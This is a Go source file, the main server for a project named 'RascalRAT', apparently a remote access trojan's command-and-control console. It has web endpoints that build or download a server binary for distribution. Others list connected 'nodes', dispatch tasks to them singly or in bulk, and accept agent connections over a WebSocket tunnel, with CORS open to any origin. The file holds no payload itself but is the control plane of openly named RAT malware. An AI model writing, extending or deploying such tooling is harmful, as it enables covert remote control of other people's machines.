package main

import (
	"context"
	"errors"
	"fmt"
	"html/template"
	"io"
	"net/http"
	"os"
	"os/exec"
	"os/signal"
	"path/filepath"
	"strings"
	"sync"
	"syscall"
	"time"

	"github.com/its-ernest/RascalRAT/internal/ws"
	"github.com/its-ernest/RascalRAT/pkg/server"

	"log/slog"

	"github.com/labstack/echo/v5"
	"github.com/labstack/echo/v5/middleware"
	"github.com/joho/godotenv"
)

type TemplateRenderer struct {
	templates *template.Template
}

func (r *TemplateRenderer) Render(c *echo.Context, w io.Writer, name string, data any) error {
	return r.templates.ExecuteTemplate(w, name, data)
}

func main() {
	godotenv.Load(".env")

	if err := server.ReadAndPrintFile("doom.txt", "cyan"); err != nil {
		fmt.Println("Error:", err)
	}

	logger := slog.New(slog.NewTextHandler(os.Stdout, &slog.HandlerOptions{Level: slog.LevelDebug}))
	slog.SetDefault(logger)

	e := echo.New()
	e.Renderer = &TemplateRenderer{templates: template.Must(template.ParseGlob("templates/*.html"))}
	e.Use(middleware.RequestLogger())
	e.Use(middleware.Recover())

	// Allow browser control scripts running on localhost to send requests
	e.Use(middleware.CORSWithConfig(middleware.CORSConfig{
		AllowOrigins: []string{"*"},
		AllowHeaders: []string{echo.HeaderOrigin, echo.HeaderContentType, echo.HeaderAccept},
		AllowMethods: []string{http.MethodGet, http.MethodPost},
	}))

	hub := ws.NewHub()

	// Build status tracking
	var (
		buildMutex     sync.Mutex
		buildStatus    = "idle"
		buildError     string
		buildOutput    string
		buildArtifact  string
	)

	initAuthRoutes(e)
	applyAuthMiddleware(e)

	// Operational REST Endpoints
	e.GET("/", func(c *echo.Context) error {
		return c.Render(http.StatusOK, "index.html", map[string]any{"Title": "RascalRAT Console"})
	})
	e.GET("/status", handleStatus)

	// Build endpoints
	e.POST("/build_docker", func(c *echo.Context) error {
		buildMutex.Lock()
		if buildStatus == "building" {
			buildMutex.Unlock()
			return c.JSON(http.StatusConflict, map[string]string{"error": "Build already in progress"})
		}
		buildStatus = "building"
		buildError = ""
		buildOutput = ""
		buildArtifact = ""
		buildMutex.Unlock()

		go func() {
			ctx, cancel := context.WithTimeout(context.Background(), 10*time.Minute)
			defer cancel()

			// Run docker build
			cmd := exec.CommandContext(ctx, "docker", "build", "-t", "rascalrat-server", ".")
			cmd.Dir, _ = os.Getwd()
			out, err := cmd.CombinedOutput()
			buildOutput = string(out)

			buildMutex.Lock()
			defer buildMutex.Unlock()

			if err != nil {
				buildStatus = "error"
				buildError = fmt.Sprintf("Docker build failed: %v\n%s", err, buildOutput)
				return
			}

			// Copy binary from container
			artifactPath := filepath.Join("bin", "server")
			cmd = exec.CommandContext(ctx, "docker", "create", "--name", "rascalrat-extract", "rascalrat-server")
			cmd.Dir, _ = os.Getwd()
			if out, err = cmd.CombinedOutput(); err != nil {
				buildStatus = "error"
				buildError = fmt.Sprintf("Container create failed: %v\n%s", err, string(out))
				return
			}

			cmd = exec.CommandContext(ctx, "docker", "cp", "rascalrat-extract:/app/server", artifactPath)
			if out, err = cmd.CombinedOutput(); err != nil {
				buildStatus = "error"
				buildError = fmt.Sprintf("Binary copy failed: %v\n%s", err, string(out))
				exec.Command("docker", "rm", "-f", "rascalrat-extract").Run()
				return
			}

			exec.Command("docker", "rm", "-f", "rascalrat-extract").Run()

			buildArtifact = artifactPath
			buildStatus = "done"
		}()

		return c.JSON(http.StatusAccepted, map[string]string{"status": "building", "message": "Docker build started"})
	})

	e.POST("/build_github", func(c *echo.Context) error {
		var req struct {
			RepoURL string `json:"repo_url"`
		}
		if err := c.Bind(&req); err != nil {
			return c.JSON(http.StatusBadRequest, map[string]string{"error": "Invalid request"})
		}

		buildMutex.Lock()
		if buildStatus == "building" {
			buildMutex.Unlock()
			return c.JSON(http.StatusConflict, map[string]string{"error": "Build already in progress"})
		}
		buildStatus = "building"
		buildError = ""
		buildOutput = ""
		buildArtifact = ""
		buildMutex.Unlock()

		go func() {
			repoURL := req.RepoURL
			if repoURL == "" {
				repoURL = "https://github.com/its-ernest/RascalRAT"
			}

			// Use nightly.link to get GitHub Actions artifact
			ctx, cancel := context.WithTimeout(context.Background(), 15*time.Minute)
			defer cancel()

			// Try to download from nightly.link
			artifactPath := filepath.Join("bin", "server")
			cmd := exec.CommandContext(ctx, "curl", "-fL", "-o", artifactPath,
				fmt.Sprintf("https://nightly.link/%s/workflows/build/main/server.zip", strings.TrimPrefix(repoURL, "https://github.com/")))
			out, err := cmd.CombinedOutput()
			buildOutput = string(out)

			buildMutex.Lock()
			defer buildMutex.Unlock()

			if err != nil {
				buildStatus = "error"
				buildError = fmt.Sprintf("GitHub CI download failed: %v\n%s", err, buildOutput)
				return
			}

			// Unzip if needed
			if strings.HasSuffix(artifactPath, ".zip") {
				cmd = exec.Command("unzip", "-o", artifactPath, "-d", filepath.Dir(artifactPath))
				if out, err = cmd.CombinedOutput(); err != nil {
					buildStatus = "error"
					buildError = fmt.Sprintf("Unzip failed: %v\n%s", err, string(out))
					return
				}
			}

			buildArtifact = "bin/server"
			buildStatus = "done"
		}()

		return c.JSON(http.StatusAccepted, map[string]string{"status": "building", "message": "GitHub CI build started"})
	})

	e.GET("/build_status", func(c *echo.Context) error {
		buildMutex.Lock()
		defer buildMutex.Unlock()

		resp := map[string]string{
			"status":  buildStatus,
			"error":   buildError,
			"output":  buildOutput,
		}
		if buildArtifact != "" {
			resp["artifact"] = buildArtifact
		}
		return c.JSON(http.StatusOK, resp)
	})

	e.GET("/download_server", func(c *echo.Context) error {
		buildMutex.Lock()
		artifact := buildArtifact
		buildMutex.Unlock()

		if artifact == "" || !filepath.IsAbs(artifact) {
			// Try relative path
			artifact = filepath.Join("bin", "server")
		}

		if _, err := os.Stat(artifact); os.IsNotExist(err) {
			return c.JSON(http.StatusNotFound, map[string]string{"error": "Server binary not found. Run a build first."})
		}

		return c.Attachment(artifact, "rascalrat-server")
	})

	// Node Management and Task Execution Endpoints
	e.GET("/nodes", func(c *echo.Context) error {
		return handleListNodes(c, hub)
	})
	e.POST("/nodes/task", func(c *echo.Context) error {
		return handleDispatchTaskMulti(c, hub)
	})
	e.POST("/nodes/:id/task", func(c *echo.Context) error {
		return handleDispatchTask(c, hub)
	})

	// The Single WebSocket tracking tunnel endpoint
	e.GET("/ws/connect", func(c *echo.Context) error {
		return handleAgentWebSocket(c, hub)
	})

	ctx, cancel := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)
	defer cancel()

	addr := os.Getenv("PORT")
	if addr == "" {
		addr = ":8182"
	} else if !strings.HasPrefix(addr, ":") {
		addr = ":" + addr
	}

	sc := echo.StartConfig{
		Address:         addr,
		GracefulTimeout: 10 * time.Second,
	}

	slog.Info("starting high-performance administration console", "port", sc.Address)

	if err := sc.Start(ctx, e); err != nil && !errors.Is(err, http.ErrServerClosed) {
		slog.Error("server boot failure", "err", err)
	}

	hub.CloseAll("server shutdown")
	slog.Info("management api gracefully exited.")
}

func handleStatus(c *echo.Context) error {
	return c.JSON(http.StatusOK, map[string]string{"status": "operational"})
}
